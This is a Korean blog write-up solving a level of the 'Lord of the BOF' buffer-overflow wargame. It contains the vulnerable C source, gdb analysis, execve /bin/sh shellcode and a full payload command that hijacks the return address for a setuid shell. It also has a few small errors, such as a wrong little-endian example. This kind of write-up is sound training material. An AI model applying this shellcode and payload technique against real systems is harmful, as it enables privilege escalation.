---
title: BOF/ LOB-level9(troll)
tags: LOB
---

LOB란 The Lord of the BOF의 약자로 Buffer over-flow를 연습해 볼 수 있는 해킹문제이다.    
총 20문제로 구성되어 있으며 각 문제를 격파하여 다음 레벨의 패스워드를 얻는 형식이다.  
문제를 격파하고 다음 레벨의 bash를 획득하였다면 my-pass로 패스워드를 확인할 수 있다.  

 [send me email](mailto:jewel7492@gmail.com) if you have any questions.

<!--more-->

---
### LOB Level 9(troll)
**ID : troll**  
**PASSWD : aspirin**  

```bash
$ bash2
```
풀이 시작 전에 bash2로 꼭 변경  
**bash는 \xff를 \x00(NULL)로 인식하여 제대로 문제를 풀 수 없다.**  

![그림1](/assets/LOB/level9/1.PNG)  
사용자 vampire의 권한의 vampire파일이 있음을 확인할 수 있다.  
**set-uid가 걸려있으므로 사용자 vampire의 권한으로 파일을 실행할 수 있다.**  
**vampire파일이 쉘을 실행시키도록 한다면 사용자 vampire의 쉘을 획득할 수 있다.**  

<br />
{% highlight C linenos %}  
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }
.
        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
{% endhighlight %}  
**vampire.c**

### 소스분석  
1. argc가 2보다 작다면 "ergv error"을 출력하고 프로그램을 종료한다.  
**argc란? - 파라미터의 개수를 의미한다. 즉 main에 최소 2개이상의 인자를 전달하여야 한다.**  
**[LOB(level5)](https://limjunho.github.io/2019/11/03/LOB-level5(orc).html#lob-level-5orc)와 같이 argv[2]를 이용한 공격 불가**  
2. argv[1][47]의 값이 \xbf가 아닌경우 "stack is still your friend" 출력 후 프로그램 종료  
**RTL기법 사용 불가 What is RTL? - [LOB(level13)](https://limjunho.github.io/2020/03/14/LOB-level13(darkknight).html)**  
3. argv[1][46]의 값이 \xff인 경우 "but it's not forever"를 출력하고 프로그램 종료  
**argv[1][44]~argv[1][47]은 RET에 변조될 값인데 지금까지 bof시키던 주소값들은 bfffxxxx의 형식이였다.**  
**즉, 주소값을 조작할 방법을 찾아야 한다.**  
4. main에 전달받은 인자 argv[1]을 buffer에 복사하여 출력(argv[0]은 파일명)  
**strcpy함수는 복사할 데이터의 크기제한이 없기 때문에 argv[1]이 40Byte보다 크다면 buffer-overflow가 발생하는 취약점이 있다.**  

### Solution  
**[LOB(level5)](https://limjunho.github.io/2019/11/03/LOB-level5(orc).html#lob-level-5orc)와 비슷하게 argv[2]를 이용해 공격.**  
**스택은 높은 주소에서 낮은 주소로 자란다. -> argv[2]가 argv[1]보다 먼저 stack에 저장되기 때문에 argv[2]에 많은 값을 삽입하면 argv[1]의 주소가 낮아지게 될 것이다.**  


#### level9에서 사용한 쉘코드  
**\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80**  
**25Byte**  

**buffer over-flow를 이용하기 위해서는 프로그램 Stack의 구조를 알아야 한다.**  

스택구조|
---|
buffer(40Byte)|
sfp(4Byte)|
ret(4Byte)| 

**SFP(Stack frame pointer) - 이전 함수의 EBP주소를 담고 있다.**  
(EBP - 스택의 가장 바닥을 가리키는 포인터)  
**RET(Return Address) - 함수가 종료시 return될 주소**  

#### debugging  
**권한문제가 없도록 gremlin를 복사하고 gdb를 사용하여 intel방식으로 디스어셈블 한다.**  

![그림2](/assets/LOB/level9/2.PNG)  
main함수 disassemble.  

![그림3](/assets/LOB/level9/3.PNG)  
main함수 종료 전에 breakpoint를 걸고 인자를 전달해보았다.  
**전달한 인자(argv[0])가 0xbfff~범위에 있음을 확인**  

![그림4](/assets/LOB/level9/4.PNG)  
**argv[2]에 A를 20000개 전달하였더니 argv[1]의 주소가 낮아진것을 확인**
**A를 20000개 전달했을 때, argv[1]주소 -> 0xbfffae08**  
하지만 여전히 bfff의 형식임.  

![그림5](/assets/LOB/level9/5.PNG)  
**argv[2]에 AAAA를 20000개 전달하였더니 argv[1]의 주소가 낮아진것을 확인**
**A를 20000개 전달했을 때, argv[1]주소 -> 0xbffec3a8**

### argv[1]주소확인  
{% highlight C linenos %}  
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }
.
        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
        printf("%p\n", argv[1]);
}
{% endhighlight %}  
**vampire.c를 복사하여 소스 추가 -> printf("%p\n", argv[1]);**  

![그림6](/assets/LOB/level9/6.PNG)  
**정확한 주소 체크. -> 0xbffec3a6**  

### Attack  

argv[1]의 주소와 스택의 구조를 파악하였으므로 공격을 시도할 수 있다.  
**./vampire + [ShellCode] + [dummy] + [argv[1]주소]**의 형태로 공격.  
**이 때 ShellCode + dummy값의 길이는 buffer의 길이 + sfp(4byte)만큼 즉 44Byte여야 한다.**  
**또한 RET에 덮을 argv[1]의 주소는 리틀 엔디안 방식으로 기입한다.**  

**리틀 엔디안은 최 하위 바이트 부터 저장하는 방식이다.**  
ex) 0xbffffc11을 리틀 엔디안 방식으로 저장하면 11cfffbf가 된다.  
보통 엔디안 방식은 CPU 아키텍쳐에 따라 다르지만 intel x86, x64, AMD 계열은 리틀엔디안, 모토로라 프로세서들은 빅엔디안을 사용한다.  
현재 시스템의 엔디안방식을 확인하고 싶다면 echo -n I | od -to2 | head -n1 | awk'{print $2;}' | cut -c6  
명령으로 나오는 값이 1이라면 리틀 엔디안, 0이라면 빅엔디안이다.  

![그림7](/assets/LOB/level9/7.PNG)  
공격 성공.   

**페이로드**  
```bash
$ ./vampire `python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80' + 'A' * 19 + '\xa6\xc3\xfe\xbf'"` `python -c "print 'AAAA' * 20000"`
```